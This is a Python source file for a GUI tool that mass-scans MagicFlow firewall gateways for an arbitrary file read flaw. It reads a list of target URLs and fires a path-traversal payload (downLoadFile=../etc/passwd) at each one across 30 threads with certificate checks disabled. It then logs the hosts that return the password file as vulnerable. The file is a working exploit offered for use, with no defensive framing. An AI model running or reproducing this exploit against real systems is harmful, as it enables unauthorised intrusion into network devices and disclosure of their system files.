import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from tkinter import *
from PIL.ImageTk import PhotoImage
from ttkbootstrap.constants import *
def magicflow_readfile_exp(url):
    poc = r"""/msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=msagroup.txt+downLoadFile=../etc/passwd"""
    url = url + poc
    try:
        res = requests.get(url, verify=False, timeout=3)
        if "root" in res.text:
            magicflow_readfile_text.insert(END,"[! ! ! ! ! ! ] Vulnerable url:" + url + "\n")
            magicflow_readfile_text.see(END)
            with open ("[exists]magicflow_readfile_url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            magicflow_readfile_text.insert(END,"[×]URL without vulnerability:" + url + "\n")
            magicflow_readfile_text.see(END)
    except Exception as err:
        magicflow_readfile_text.insert(END, "[×]The target request failed, and the error content:" + str(err) + "\n")
        magicflow_readfile_text.see(END)
def get_magicflow_readfile_addr():
    with open("corrected url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def magicflow_readfile_gui():
    magicflow_readfile = Toplevel()
    magicflow_readfile.geometry("1035x455")
    magicflow_readfile.title("MagicFlow firewall gateway reads arbitrary files [auto-muti-exp]")
    magicflow_readfile.resizable(0, 0)
    logo = PhotoImage(file="./logo.ico")
    magicflow_readfile.tk.call('wm', 'iconphoto', magicflow_readfile._w, logo)
    global magicflow_readfile_text
    magicflow_readfile_text = scrolledtext.ScrolledText(magicflow_readfile,width=123, height=25)
    magicflow_readfile_text.grid(row=0, column=0, padx=10, pady=10)
    magicflow_readfile_text.see(END)
    addrs = get_magicflow_readfile_addr()
    max_thread_num = 30
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(magicflow_readfile_exp, addr)
    magicflow_readfile.mainloop()